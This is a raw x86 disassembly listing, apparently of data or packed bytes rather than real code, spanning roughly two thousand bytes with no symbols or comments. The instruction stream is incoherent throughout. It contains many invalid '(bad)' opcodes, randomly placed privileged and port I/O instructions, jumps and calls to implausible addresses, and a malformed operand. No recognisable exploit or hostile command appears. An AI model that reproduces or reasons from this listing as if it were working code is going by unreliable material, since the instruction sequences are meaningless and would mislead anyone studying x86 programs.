  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
